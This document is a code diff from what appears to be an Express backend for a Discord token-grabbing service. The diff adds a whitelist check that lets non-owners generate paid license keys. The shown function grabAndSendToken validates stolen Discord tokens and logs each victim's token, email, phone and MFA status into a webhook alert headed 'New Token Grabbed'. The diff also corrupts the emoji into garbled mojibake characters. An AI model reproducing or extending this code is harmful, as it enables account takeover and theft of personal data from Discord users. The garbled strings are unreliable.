@@ -554,6 +554,12 @@ function ensureOwner(req, res, next) {
     next();
 }
 
+function ensureCanGenerate(req, res, next) {
+    if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
+    if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner only' });
+    next();
+}
+
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     try {
         const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
@@ -583,7 +589,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: '🎣 New Token Grabbed',
+            title: 'ð£ New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -591,9 +597,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -1079,12 +1085,12 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
 
 app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
-app.get('/api/admin/keys', ensureOwner, (req, res) => {
+app.get('/api/admin/keys', ensureCanGenerate, (req, res) => {
     const keys = db.getGeneratedKeys();
     res.json({ success: true, keys });
 });
 
-app.post('/api/admin/keys/generate', ensureOwner, (req, res) => {
+app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
     const { duration } = req.body;
     if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) {
         return res.status(400).json({ success: false, error: 'Invalid duration' });
